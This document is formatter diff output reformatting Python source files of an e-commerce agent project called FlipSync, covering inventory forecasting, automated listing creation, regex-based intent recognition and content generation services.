             base_demand = item.sales_velocity * days_ahead
-            
+
             # Seasonal adjustments (simplified)
             current_month = datetime.now().month
             seasonal_multiplier = 1.0
-            
-            if item.category.lower() in ["electronics", "toys"] and current_month in [11, 12]:
+
+            if item.category.lower() in ["electronics", "toys"] and current_month in [
+                11,
+                12,
+            ]:
                 seasonal_multiplier = 1.3  # Holiday boost
             elif item.category.lower() == "clothing" and current_month in [3, 4, 9, 10]:
                 seasonal_multiplier = 1.1  # Season changes
-            
+
             forecasted_demand = base_demand * seasonal_multiplier
-            
+
             # Calculate confidence based on data quality
-            confidence = min(1.0, item.sales_velocity * 10)  # More sales = higher confidence
-            
+            confidence = min(
+                1.0, item.sales_velocity * 10
+            )  # More sales = higher confidence
+
             return {
                 "item_sku": item_sku,
                 "forecast_period_days": days_ahead,
                 "forecasted_demand": round(forecasted_demand, 1),
                 "confidence": confidence,
                 "seasonal_factor": seasonal_multiplier,
                 "base_velocity": item.sales_velocity,
-                "generated_at": datetime.now(timezone.utc).isoformat()
+                "generated_at": datetime.now(timezone.utc).isoformat(),
             }
-            
+
         except Exception as e:
             logger.error(f"Error forecasting demand: {e}")
             raise
 
     async def _process_response(self, response: Any) -> str:
         """Process and format the response for inventory queries."""
-        if hasattr(response, 'content'):
+        if hasattr(response, "content"):
             return response.content
         return str(response)
 
     async def handle_message(
-        self, 
-        message: str, 
-        conversation_id: str, 
-        user_id: str
+        self, message: str, conversation_id: str, user_id: str
     ) -> AgentResponse:
         """Handle inventory-related queries and requests."""
         try:
             system_prompt = """You are FlipSync's Auto Inventory Agent, an expert in automated inventory management and purchasing optimization.
 
@@ -388,30 +411,29 @@
 - Supplier performance monitoring
 
 Provide specific, data-driven inventory management advice and explain automated purchasing decisions clearly."""
 
             response = await self.llm_client.generate_response(
-                prompt=message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type="auto_inventory",
                 confidence=0.9,
                 response_time=response.response_time,
                 metadata={
                     "monitored_items": len(self.inventory_items),
                     "active_recommendations": len(self.purchase_recommendations),
                     "auto_purchasing_enabled": self.auto_purchasing_enabled,
-                    "min_roi_threshold": self.min_roi_threshold
-                }
-            )
-            
+                    "min_roi_threshold": self.min_roi_threshold,
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error handling message: {e}")
             return AgentResponse(
                 content="I'm having trouble processing your inventory request right now. Please try again.",
                 agent_type="auto_inventory",
                 confidence=0.1,
-                response_time=0.0
-            )
+                response_time=0.0,
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_inventory_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_listing_agent.py	2025-06-16 06:47:18.911817+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_listing_agent.py	2025-06-19 04:03:36.564400+00:00
@@ -8,37 +8,43 @@
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 from enum import Enum
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 
 logger = logging.getLogger(__name__)
 
 
 class ListingStatus(str, Enum):
     """Listing status types."""
+
     DRAFT = "draft"
     ACTIVE = "active"
     PAUSED = "paused"
     SOLD = "sold"
     ENDED = "ended"
     ERROR = "error"
 
 
 class ListingPlatform(str, Enum):
     """Supported listing platforms."""
+
     EBAY = "ebay"
     AMAZON = "amazon"
     WALMART = "walmart"
     ETSY = "etsy"
     FACEBOOK = "facebook"
 
 
 class OptimizationType(str, Enum):
     """Types of listing optimizations."""
+
     TITLE = "title"
     DESCRIPTION = "description"
     IMAGES = "images"
     PRICING = "pricing"
     KEYWORDS = "keywords"
@@ -46,10 +52,11 @@
 
 
 @dataclass
 class ListingTemplate:
     """Template for automated listing creation."""
+
     name: str
     platform: ListingPlatform
     category: str
     title_template: str
     description_template: str
@@ -61,10 +68,11 @@
 
 
 @dataclass
 class AutoListingResult:
     """Result of automated listing creation."""
+
     listing_id: str
     platform: ListingPlatform
     title: str
     price: float
     status: ListingStatus
@@ -75,38 +83,40 @@
 
 
 class AutoListingAgent(BaseConversationalAgent):
     """
     Automated listing agent that creates and optimizes marketplace listings.
-    
+
     Capabilities:
     - Automated listing creation from product data
     - SEO-optimized titles and descriptions
     - Multi-platform listing management
     - Image optimization and enhancement
     - Keyword research and optimization
     - Performance monitoring and adjustments
     """
-    
-    def __init__(self, agent_id: str = "auto_listing_agent", use_fast_model: bool = True):
+
+    def __init__(
+        self, agent_id: str = "auto_listing_agent", use_fast_model: bool = True
+    ):
         """Initialize the auto listing agent."""
         super().__init__(
             agent_role=AgentRole.CONTENT,
             agent_id=agent_id,
-            use_fast_model=use_fast_model
+            use_fast_model=use_fast_model,
         )
-        
+
         # Listing configuration
         self.listing_templates: List[ListingTemplate] = []
         self.active_listings: Dict[str, AutoListingResult] = {}
         self.auto_optimization_enabled = True
-        
+
         # Initialize default templates
         self._initialize_default_templates()
-        
+
         logger.info(f"AutoListingAgent initialized: {self.agent_id}")
-    
+
     def _initialize_default_templates(self):
         """Initialize default listing templates."""
         self.listing_templates = [
             ListingTemplate(
                 name="electronics_ebay",
@@ -122,11 +132,11 @@
                 <p><strong>Shipping:</strong> {shipping_info}</p>
                 """,
                 keywords=["electronics", "gadget", "tech", "device"],
                 pricing_strategy="competitive",
                 shipping_template="Fast & Free shipping with tracking",
-                return_policy="30-day returns accepted"
+                return_policy="30-day returns accepted",
             ),
             ListingTemplate(
                 name="clothing_amazon",
                 platform=ListingPlatform.AMAZON,
                 category="clothing",
@@ -141,56 +151,62 @@
                 Perfect for {occasion}. High-quality {material} construction.
                 """,
                 keywords=["fashion", "clothing", "apparel", "style"],
                 pricing_strategy="premium",
                 shipping_template="Prime eligible - Free 2-day shipping",
-                return_policy="Amazon return policy applies"
-            )
+                return_policy="Amazon return policy applies",
+            ),
         ]
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get agent-specific context for prompt generation."""
         return {
             "agent_type": "automated_listing_specialist",
             "capabilities": [
                 "Automated listing creation",
                 "SEO optimization",
                 "Multi-platform management",
                 "Content generation",
-                "Performance optimization"
+                "Performance optimization",
             ],
             "supported_platforms": [platform.value for platform in ListingPlatform],
             "active_templates": len([t for t in self.listing_templates if t.enabled]),
-            "active_listings": len(self.active_listings)
+            "active_listings": len(self.active_listings),
         }
-    
+
     async def create_automated_listing(
         self,
         product_data: Dict[str, Any],
         platform: ListingPlatform,
-        template_name: Optional[str] = None
+        template_name: Optional[str] = None,
     ) -> AutoListingResult:
         """Create an automated listing from product data."""
         try:
             # Select appropriate template
-            template = self._select_template(platform, product_data.get("category"), template_name)
-            
+            template = self._select_template(
+                platform, product_data.get("category"), template_name
+            )
+
             if not template:
                 raise ValueError(f"No suitable template found for {platform.value}")
-            
+
             # Generate optimized title
             title = await self._generate_optimized_title(product_data, template)
-            
+
             # Generate optimized description
-            description = await self._generate_optimized_description(product_data, template)
-            
+            description = await self._generate_optimized_description(
+                product_data, template
+            )
+
             # Calculate optimal price
             price = await self._calculate_listing_price(product_data, platform)
-            
+
             # Apply SEO optimizations
-            optimizations = await self._apply_seo_optimizations(title, description, product_data)
-            
+            optimizations = await self._apply_seo_optimizations(
+                title, description, product_data
+            )
+
             # Create listing result
             listing_result = AutoListingResult(
                 listing_id=f"auto_{platform.value}_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                 platform=platform,
                 title=optimizations.get("optimized_title", title),
@@ -200,56 +216,58 @@
                 confidence=self._calculate_listing_confidence(product_data, template),
                 created_at=datetime.now(timezone.utc),
                 metadata={
                     "template_used": template.name,
                     "original_title": title,
-                    "description": optimizations.get("optimized_description", description),
+                    "description": optimizations.get(
+                        "optimized_description", description
+                    ),
                     "keywords": optimizations.get("keywords", []),
-                    "category": product_data.get("category", "unknown")
-                }
-            )
-            
+                    "category": product_data.get("category", "unknown"),
+                },
+            )
+
             # Store listing
             self.active_listings[listing_result.listing_id] = listing_result
-            
+
             return listing_result
-            
+
         except Exception as e:
             logger.error(f"Error creating automated listing: {e}")
             raise
-    
+
     def _select_template(
-        self, 
-        platform: ListingPlatform, 
-        category: Optional[str], 
-        template_name: Optional[str]
+        self,
+        platform: ListingPlatform,
+        category: Optional[str],
+        template_name: Optional[str],
     ) -> Optional[ListingTemplate]:
         """Select the best template for the listing."""
         if template_name:
             # Find specific template by name
             for template in self.listing_templates:
                 if template.name == template_name and template.enabled:
                     return template
-        
+
         # Find template by platform and category
         for template in self.listing_templates:
-            if (template.platform == platform and 
-                template.enabled and 
-                (not category or template.category == category)):
+            if (
+                template.platform == platform
+                and template.enabled
+                and (not category or template.category == category)
+            ):
                 return template
-        
+
         # Find any template for the platform
         for template in self.listing_templates:
             if template.platform == platform and template.enabled:
                 return template
-        
+
         return None
-    
+
     async def _generate_optimized_title(
-        self, 
-        product_data: Dict[str, Any], 
-        template: ListingTemplate
+        self, product_data: Dict[str, Any], template: ListingTemplate
     ) -> str:
         """Generate SEO-optimized title using AI."""
         try:
             prompt = f"""
             Create an optimized marketplace listing title for this product:
@@ -270,32 +288,30 @@
             - Highlight unique selling points
             - Follow platform best practices
             
             Generate an optimized title:
             """
-            
+
             response = await self.llm_client.generate_response(
                 prompt=prompt,
-                system_prompt="You are an expert marketplace listing optimizer. Create compelling, SEO-friendly titles."
-            )
-            
+                system_prompt="You are an expert marketplace listing optimizer. Create compelling, SEO-friendly titles.",
+            )
+
             return response.content.strip()
-            
+
         except Exception as e:
             logger.error(f"Error generating title: {e}")
             # Fallback to template-based title
             return template.title_template.format(
-                brand=product_data.get('brand', 'Unknown'),
-                model=product_data.get('model', ''),
-                condition=product_data.get('condition', 'Used'),
-                key_features=', '.join(product_data.get('features', [])[:2])
-            )
-    
+                brand=product_data.get("brand", "Unknown"),
+                model=product_data.get("model", ""),
+                condition=product_data.get("condition", "Used"),
+                key_features=", ".join(product_data.get("features", [])[:2]),
+            )
+
     async def _generate_optimized_description(
-        self, 
-        product_data: Dict[str, Any], 
-        template: ListingTemplate
+        self, product_data: Dict[str, Any], template: ListingTemplate
     ) -> str:
         """Generate SEO-optimized description using AI."""
         try:
             prompt = f"""
             Create an optimized marketplace listing description for this product:
@@ -313,47 +329,42 @@
             - Follow platform formatting guidelines
             - Include shipping and return information
             
             Generate an optimized description:
             """
-            
+
             response = await self.llm_client.generate_response(
                 prompt=prompt,
-                system_prompt="You are an expert marketplace copywriter. Create compelling, detailed product descriptions."
-            )
-            
+                system_prompt="You are an expert marketplace copywriter. Create compelling, detailed product descriptions.",
+            )
+
             return response.content
-            
+
         except Exception as e:
             logger.error(f"Error generating description: {e}")
             # Fallback to basic description
             return f"High-quality {product_data.get('category', 'item')} in {product_data.get('condition', 'good')} condition."
-    
+
     async def _calculate_listing_price(
-        self, 
-        product_data: Dict[str, Any], 
-        platform: ListingPlatform
+        self, product_data: Dict[str, Any], platform: ListingPlatform
     ) -> float:
         """Calculate optimal listing price."""
-        base_price = product_data.get('price', 0.0)
-        cost = product_data.get('cost', base_price * 0.7)
-        
+        base_price = product_data.get("price", 0.0)
+        cost = product_data.get("cost", base_price * 0.7)
+
         # Platform-specific pricing adjustments
         if platform == ListingPlatform.AMAZON:
             # Amazon typically allows higher prices
             return base_price * 1.05
         elif platform == ListingPlatform.EBAY:
             # eBay is more price-sensitive
             return base_price * 0.98
         else:
             return base_price
-    
+
     async def _apply_seo_optimizations(
-        self, 
-        title: str, 
-        description: str, 
-        product_data: Dict[str, Any]
+        self, title: str, description: str, product_data: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Apply SEO optimizations to listing content."""
         try:
             prompt = f"""
             Optimize this listing for search visibility:
@@ -368,61 +379,58 @@
             3. Keywords to target
             4. Category suggestions
             
             Return as JSON format with keys: optimized_title, optimized_description, keywords, category
             """
-            
+
             response = await self.llm_client.generate_response(
                 prompt=prompt,
-                system_prompt="You are an SEO expert for marketplace listings. Optimize for search visibility and conversion."
-            )
-            
+                system_prompt="You are an SEO expert for marketplace listings. Optimize for search visibility and conversion.",
+            )
+
             # Parse response (simplified - in production would use proper JSON parsing)
             return {
                 "optimized_title": title,  # Would parse from AI response
                 "optimized_description": description,  # Would parse from AI response
-                "keywords": product_data.get('keywords', []),
-                "category": product_data.get('category', 'unknown')
+                "keywords": product_data.get("keywords", []),
+                "category": product_data.get("category", "unknown"),
             }
-            
+
         except Exception as e:
             logger.error(f"Error applying SEO optimizations: {e}")
             return {
-                "keywords": product_data.get('keywords', []),
-                "category": product_data.get('category', 'unknown')
+                "keywords": product_data.get("keywords", []),
+                "category": product_data.get("category", "unknown"),
             }
-    
+
     def _calculate_listing_confidence(
-        self, 
-        product_data: Dict[str, Any], 
-        template: ListingTemplate
+        self, product_data: Dict[str, Any], template: ListingTemplate
     ) -> float:
         """Calculate confidence in the automated listing."""
         confidence = 0.5  # Base confidence
-        
+
         # More product data = higher confidence
-        required_fields = ['brand', 'model', 'condition', 'category', 'price']
-        available_fields = sum(1 for field in required_fields if product_data.get(field))
+        required_fields = ["brand", "model", "condition", "category", "price"]
+        available_fields = sum(
+            1 for field in required_fields if product_data.get(field)
+        )
         confidence += (available_fields / len(required_fields)) * 0.3
-        
+
         # Template match = higher confidence
-        if template.category == product_data.get('category'):
+        if template.category == product_data.get("category"):
             confidence += 0.2
-        
+
         return min(1.0, confidence)
 
     async def _process_response(self, response: Any) -> str:
         """Process and format the response for listing queries."""
-        if hasattr(response, 'content'):
+        if hasattr(response, "content"):
             return response.content
         return str(response)
 
     async def handle_message(
-        self, 
-        message: str, 
-        conversation_id: str, 
-        user_id: str
+        self, message: str, conversation_id: str, user_id: str
     ) -> AgentResponse:
         """Handle listing-related queries and requests."""
         try:
             system_prompt = """You are FlipSync's Auto Listing Agent, an expert in automated marketplace listing creation and optimization.
 
@@ -434,29 +442,28 @@
 - Performance monitoring and improvements
 
 Provide specific, actionable advice for listing optimization and automation."""
 
             response = await self.llm_client.generate_response(
-                prompt=message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type="auto_listing",
                 confidence=0.9,
                 response_time=response.response_time,
                 metadata={
                     "active_templates": len(self.listing_templates),
                     "active_listings": len(self.active_listings),
-                    "optimization_enabled": self.auto_optimization_enabled
-                }
-            )
-            
+                    "optimization_enabled": self.auto_optimization_enabled,
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error handling message: {e}")
             return AgentResponse(
                 content="I'm having trouble processing your listing request right now. Please try again.",
                 agent_type="auto_listing",
                 confidence=0.1,
-                response_time=0.0
-            )
+                response_time=0.0,
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_listing_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/advanced_nlu.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/advanced_nlu.py	2025-06-19 04:03:37.126156+00:00
@@ -16,11 +16,11 @@
 
 
 @dataclass
 class Entity:
     """Represents an extracted entity from user input."""
-    
+
     entity_type: str
     value: str
     confidence: float
     start_pos: int
     end_pos: int
@@ -28,22 +28,22 @@
 
 
 @dataclass
 class Intent:
     """Represents a recognized user intent."""
-    
+
     intent_name: str
     confidence: float
     entities: List[Entity] = field(default_factory=list)
     context: Dict[str, Any] = field(default_factory=dict)
     suggested_agent: Optional[str] = None
 
 
 @dataclass
 class ConversationContext:
     """Maintains conversation context and history."""
-    
+
     session_id: UUID = field(default_factory=uuid4)
     user_id: Optional[str] = None
     conversation_history: List[Dict[str, Any]] = field(default_factory=list)
     current_topic: Optional[str] = None
     active_entities: Dict[str, Entity] = field(default_factory=dict)
@@ -52,324 +52,316 @@
 
 
 class AdvancedNLU:
     """
     Advanced Natural Language Understanding system.
-    
+
     Features:
     - Intent recognition with confidence scoring
     - Named entity recognition and extraction
     - Context-aware understanding
     - Agent routing recommendations
     - Multi-turn conversation support
     - E-commerce domain specialization
     """
-    
+
     def __init__(self, config: Optional[Dict[str, Any]] = None):
         """
         Initialize the Advanced NLU system.
-        
+
         Args:
             config: Optional configuration dictionary
         """
         self.config = config or {}
         self.intent_patterns = self._load_intent_patterns()
         self.entity_patterns = self._load_entity_patterns()
         self.agent_routing_rules = self._load_agent_routing_rules()
         self.conversation_contexts: Dict[str, ConversationContext] = {}
-        
+
         logger.info("AdvancedNLU initialized")
-    
+
     def _load_intent_patterns(self) -> Dict[str, List[str]]:
         """Load intent recognition patterns."""
         return {
             "price_inquiry": [
                 r"what.*price.*",
                 r"how much.*cost.*",
                 r"price.*for.*",
                 r"cost.*of.*",
-                r".*pricing.*"
+                r".*pricing.*",
             ],
             "inventory_check": [
                 r".*in stock.*",
                 r".*available.*",
                 r".*inventory.*",
                 r"how many.*",
-                r".*quantity.*"
+                r".*quantity.*",
             ],
             "listing_management": [
                 r".*create.*listing.*",
                 r".*update.*listing.*",
                 r".*edit.*product.*",
                 r".*modify.*description.*",
-                r".*change.*title.*"
+                r".*change.*title.*",
             ],
             "sales_analytics": [
                 r".*sales.*report.*",
                 r".*performance.*",
                 r".*analytics.*",
                 r".*metrics.*",
-                r"how.*selling.*"
+                r"how.*selling.*",
             ],
             "shipping_inquiry": [
                 r".*shipping.*",
                 r".*delivery.*",
                 r".*tracking.*",
                 r".*shipment.*",
-                r"when.*arrive.*"
+                r"when.*arrive.*",
             ],
             "competitor_analysis": [
                 r".*competitor.*",
                 r".*competition.*",
                 r".*market.*analysis.*",
                 r".*compare.*prices.*",
-                r".*other.*sellers.*"
+                r".*other.*sellers.*",
             ],
             "strategy_planning": [
                 r".*strategy.*",
                 r".*plan.*",
                 r".*optimize.*",
                 r".*improve.*sales.*",
-                r".*recommendations.*"
-            ]
-        }
-    
+                r".*recommendations.*",
+            ],
+        }
+
     def _load_entity_patterns(self) -> Dict[str, str]:
         """Load entity extraction patterns."""
         return {
             "product_sku": r"\b[A-Z0-9]{6,12}\b",
             "price": r"\$?\d+\.?\d*",
             "quantity": r"\b\d+\s*(pieces?|items?|units?)?\b",
             "marketplace": r"\b(amazon|ebay|etsy|shopify)\b",
             "category": r"\b(electronics|clothing|books|toys|home)\b",
             "time_period": r"\b(today|yesterday|week|month|year|daily|weekly|monthly)\b",
-            "order_id": r"\b\d{10,15}\b"
-        }
-    
+            "order_id": r"\b\d{10,15}\b",
+        }
+
     def _load_agent_routing_rules(self) -> Dict[str, str]:
         """Load agent routing rules based on intents."""
         return {
             "price_inquiry": "market_agent",
-            "inventory_check": "inventory_agent", 
+            "inventory_check": "inventory_agent",
             "listing_management": "content_agent",
             "sales_analytics": "executive_agent",
             "shipping_inquiry": "logistics_agent",
             "competitor_analysis": "market_analyzer",
-            "strategy_planning": "strategy_agent"
-        }
-    
+            "strategy_planning": "strategy_agent",
+        }
+
     async def understand(
-        self, 
-        user_input: str, 
+        self,
+        user_input: str,
         session_id: Optional[str] = None,
-        user_id: Optional[str] = None
+        user_id: Optional[str] = None,
     ) -> Intent:
         """
         Understand user input and extract intent, entities, and context.
-        
+
         Args:
             user_input: User's natural language input
             session_id: Optional session identifier
             user_id: Optional user identifier
-            
+
         Returns:
             Recognized intent with entities and routing information
         """
         # Get or create conversation context
         context = self._get_conversation_context(session_id, user_id)
-        
+
         # Recognize intent
         intent_name, intent_confidence = self._recognize_intent(user_input, context)
-        
+
         # Extract entities
         entities = self._extract_entities(user_input)
-        
+
         # Update context with new entities
         self._update_context_entities(context, entities)
-        
+
         # Determine suggested agent
         suggested_agent = self._route_to_agent(intent_name, entities, context)
-        
+
         # Create intent object
         intent = Intent(
             intent_name=intent_name,
             confidence=intent_confidence,
             entities=entities,
             context=context.active_entities,
-            suggested_agent=suggested_agent
+            suggested_agent=suggested_agent,
         )
-        
+
         # Update conversation history
         self._update_conversation_history(context, user_input, intent)
-        
-        logger.info(f"Understood intent: {intent_name} (confidence: {intent_confidence:.2f})")
+
+        logger.info(
+            f"Understood intent: {intent_name} (confidence: {intent_confidence:.2f})"
+        )
         return intent
-    
+
     def _get_conversation_context(
-        self, 
-        session_id: Optional[str], 
-        user_id: Optional[str]
+        self, session_id: Optional[str], user_id: Optional[str]
     ) -> ConversationContext:
         """Get or create conversation context."""
         if session_id and session_id in self.conversation_contexts:
             context = self.conversation_contexts[session_id]
             context.last_interaction = datetime.utcnow()
             return context
-        
+
         # Create new context
         context = ConversationContext(user_id=user_id)
         if session_id:
             self.conversation_contexts[session_id] = context
-        
+
         return context
-    
+
     def _recognize_intent(
-        self, 
-        user_input: str, 
-        context: ConversationContext
+        self, user_input: str, context: ConversationContext
     ) -> Tuple[str, float]:
         """Recognize user intent from input."""
         user_input_lower = user_input.lower()
         best_intent = "general_inquiry"
         best_confidence = 0.0
-        
+
         for intent_name, patterns in self.intent_patterns.items():
             for pattern in patterns:
                 if re.search(pattern, user_input_lower):
                     # Calculate confidence based on pattern match quality
-                    confidence = self._calculate_pattern_confidence(pattern, user_input_lower)
-                    
+                    confidence = self._calculate_pattern_confidence(
+                        pattern, user_input_lower
+                    )
+
                     # Boost confidence if related to current topic
                     if context.current_topic and intent_name in context.current_topic:
                         confidence *= 1.2
-                    
+
                     if confidence > best_confidence:
                         best_intent = intent_name
                         best_confidence = confidence
-        
+
         return best_intent, min(1.0, best_confidence)
-    
+
     def _extract_entities(self, user_input: str) -> List[Entity]:
         """Extract entities from user input."""
         entities = []
-        
+
         for entity_type, pattern in self.entity_patterns.items():
             matches = re.finditer(pattern, user_input, re.IGNORECASE)
-            
+
             for match in matches:
                 entity = Entity(
                     entity_type=entity_type,
                     value=match.group(),
                     confidence=0.8,  # Base confidence for pattern matches
                     start_pos=match.start(),
-                    end_pos=match.end()
+                    end_pos=match.end(),
                 )
                 entities.append(entity)
-        
+
         return entities
-    
+
     def _update_context_entities(
-        self, 
-        context: ConversationContext, 
-        entities: List[Entity]
+        self, context: ConversationContext, entities: List[Entity]
     ) -> None:
         """Update conversation context with new entities."""
         for entity in entities:
             # Keep most recent entity of each type
             context.active_entities[entity.entity_type] = entity
-    
+
     def _route_to_agent(
-        self, 
-        intent_name: str, 
-        entities: List[Entity], 
-        context: ConversationContext
+        self, intent_name: str, entities: List[Entity], context: ConversationContext
     ) -> Optional[str]:
         """Determine which agent should handle this request."""
         # Primary routing based on intent
         suggested_agent = self.agent_routing_rules.get(intent_name)
-        
+
         # Secondary routing based on entities
         if not suggested_agent:
             for entity in entities:
                 if entity.entity_type == "marketplace":
                     suggested_agent = f"{entity.value}_agent"
                     break
                 elif entity.entity_type == "category":
                     suggested_agent = "content_agent"
                     break
-        
+
         # Context-based routing
         if not suggested_agent and context.current_topic:
             if "pricing" in context.current_topic:
                 suggested_agent = "market_agent"
             elif "inventory" in context.current_topic:
                 suggested_agent = "inventory_agent"
-        
+
         return suggested_agent or "general_assistant"
-    
+
     def _calculate_pattern_confidence(self, pattern: str, text: str) -> float:
         """Calculate confidence score for pattern match."""
         # Simple confidence calculation based on pattern specificity
         base_confidence = 0.7
-        
+
         # Boost for exact matches
         if pattern.replace(".*", "").replace(r"\b", "") in text:
             base_confidence += 0.2
-        
+
         # Boost for multiple keyword matches
-        keywords = re.findall(r'\w+', pattern.replace(".*", ""))
+        keywords = re.findall(r"\w+", pattern.replace(".*", ""))
         keyword_matches = sum(1 for keyword in keywords if keyword in text)
         if keywords:
             keyword_ratio = keyword_matches / len(keywords)
             base_confidence += keyword_ratio * 0.1
-        
+
         return min(1.0, base_confidence)
-    
+
     def _update_conversation_history(
-        self, 
-        context: ConversationContext, 
-        user_input: str, 
-        intent: Intent
+        self, context: ConversationContext, user_input: str, intent: Intent
     ) -> None:
         """Update conversation history."""
         history_entry = {
             "timestamp": datetime.utcnow().isoformat(),
             "user_input": user_input,
             "intent": intent.intent_name,
             "confidence": intent.confidence,
             "entities": [entity.entity_type for entity in intent.entities],
-            "suggested_agent": intent.suggested_agent
-        }
-        
+            "suggested_agent": intent.suggested_agent,
+        }
+
         context.conversation_history.append(history_entry)
-        
+
         # Keep only last 10 interactions
         if len(context.conversation_history) > 10:
             context.conversation_history = context.conversation_history[-10:]
-        
+
         # Update current topic
         context.current_topic = intent.intent_name
-    
+
     async def get_context_summary(self, session_id: str) -> Dict[str, Any]:
         """Get summary of conversation context."""
         if session_id not in self.conversation_contexts:
             return {"error": "Session not found"}
-        
+
         context = self.conversation_contexts[session_id]
-        
+
         return {
             "session_id": str(context.session_id),
             "user_id": context.user_id,
             "current_topic": context.current_topic,
             "active_entities": {
-                entity_type: entity.value 
+                entity_type: entity.value
                 for entity_type, entity in context.active_entities.items()
             },
             "conversation_length": len(context.conversation_history),
-            "last_interaction": context.last_interaction.isoformat()
-        }
-    
+            "last_interaction": context.last_interaction.isoformat(),
+        }
+
     async def clear_context(self, session_id: str) -> bool:
         """Clear conversation context for a session."""
         if session_id in self.conversation_contexts:
             del self.conversation_contexts[session_id]
             return True
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/content_agent_service.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/content_agent_service.py	2025-06-19 04:03:37.121854+00:00
@@ -107,11 +107,13 @@
 
             # Generate keywords
             keywords = self._generate_keywords(request)
 
             # Calculate SEO score
-            seo_score = self._calculate_seo_score(title, description, bullet_points, keywords)
+            seo_score = self._calculate_seo_score(
+                title, description, bullet_points, keywords
+            )
 
             return ContentGenerationResponse(
                 request_id=f"gen_{uuid.uuid4().hex[:8]}",
                 marketplace=request.marketplace,
                 title=title,
@@ -215,25 +217,31 @@
             content = request.content
             content_type = request.content_type
             marketplace = request.marketplace
 
             # Calculate overall score
-            overall_score = self._calculate_overall_seo_score(content, content_type, marketplace)
+            overall_score = self._calculate_overall_seo_score(
+                content, content_type, marketplace
+            )
 
             # Analyze keywords
-            keyword_analysis = self._analyze_keywords(content, content_type, marketplace)
+            keyword_analysis = self._analyze_keywords(
+                content, content_type, marketplace
+            )
 
             # Calculate readability score
             readability_score = self._calculate_readability_score(content, content_type)
 
             # Generate recommendations
             recommendations = self._generate_seo_recommendations(
                 content, content_type, marketplace, keyword_analysis, overall_score
             )
 
             # Generate marketplace-specific tips
-            marketplace_specific_tips = self._generate_marketplace_tips(marketplace, content_type)
+            marketplace_specific_tips = self._generate_marketplace_tips(
+                marketplace, content_type
+            )
 
             return SEOAnalysisResponse(
                 analysis_id=f"seo_{uuid.uuid4().hex[:8]}",
                 marketplace=marketplace,
                 content_type=content_type,
@@ -267,17 +275,19 @@
             # Process image enhancements
             enhanced_images = []
             for url in request.image_urls:
                 enhanced_url = url.replace("original", "enhanced")
                 thumbnail_url = url.replace("original", "thumbnail")
-                
-                enhanced_images.append({
-                    "original_url": url,
-                    "enhanced_url": enhanced_url,
-                    "enhancements_applied": request.enhancements,
-                    "thumbnail_url": thumbnail_url,
-                })
+
+                enhanced_images.append(
+                    {
+                        "original_url": url,
+                        "enhanced_url": enhanced_url,
+                        "enhancements_applied": request.enhancements,
+                        "thumbnail_url": thumbnail_url,
+                    }
+                )
 
             # Check marketplace compliance
             marketplace_compliance = self._check_marketplace_compliance(
                 request.marketplace, enhanced_images, request.enhancements
             )
@@ -286,13 +296,19 @@
                 request_id=f"img_{uuid.uuid4().hex[:8]}",
                 marketplace=request.marketplace,
                 original_images=request.image_urls,
                 enhanced_images=enhanced_images,
                 enhancement_details={
-                    "background_removal": request.enhancements.get("background_removal", False),
-                    "color_correction": request.enhancements.get("color_correction", False),
-                    "shadow_addition": request.enhancements.get("shadow_addition", False),
+                    "background_removal": request.enhancements.get(
+                        "background_removal", False
+                    ),
+                    "color_correction": request.enhancements.get(
+                        "color_correction", False
+                    ),
+                    "shadow_addition": request.enhancements.get(
+                        "shadow_addition", False
+                    ),
                     "composition_improvement": request.enhancements.get(
                         "composition_improvement", False
                     ),
                 },
                 marketplace_compliance=marketplace_compliance,
@@ -364,26 +380,32 @@
             }
 
             # Filter by marketplace if specified
             if marketplace:
                 templates = {
-                    k: v for k, v in templates.items() if k.lower() == marketplace.lower()
+                    k: v
+                    for k, v in templates.items()
+                    if k.lower() == marketplace.lower()
                 }
 
             # Filter by category if specified
             if category:
                 for mkt in templates:
                     templates[mkt] = [
-                        t for t in templates[mkt] if t["category"].lower() == category.lower()
+                        t
+                        for t in templates[mkt]
+                        if t["category"].lower() == category.lower()
                     ]
 
             return templates
         except Exception as e:
             self.log_manager.error(f"Error getting content templates: {str(e)}")
             raise
 
-    def _generate_title(self, request: ContentGenerationRequest, template: Dict[str, Any]) -> str:
+    def _generate_title(
+        self, request: ContentGenerationRequest, template: Dict[str, Any]
+    ) -> str:
         """Generate title based on request and template.
 
         Args:
             request: Content generation request
             template: Content template
@@ -395,17 +417,23 @@
         # For now, return a placeholder
         product_data = request.product_data
         product_name = product_data.get("name", "Product")
         brand = product_data.get("brand", "Brand")
         features = product_data.get("features", [])
-        
-        key_feature_1 = features[0] if features and len(features) > 0 else "High Quality"
-        key_feature_2 = features[1] if features and len(features) > 1 else "Professional Grade"
-        
+
+        key_feature_1 = (
+            features[0] if features and len(features) > 0 else "High Quality"
+        )
+        key_feature_2 = (
+            features[1] if features and len(features) > 1 else "Professional Grade"
+        )
+
         return f"{brand} {product_name} - {key_feature_1} {key_feature_2}"
 
-    def _generate_description(self, request: ContentGenerationRequest, template: Dict[str, Any]) -> str:
+    def _generate_description(
+        self, request: ContentGenerationRequest, template: Dict[str, Any]
+    ) -> str:
         """Generate description based on request and template.
 
         Args:
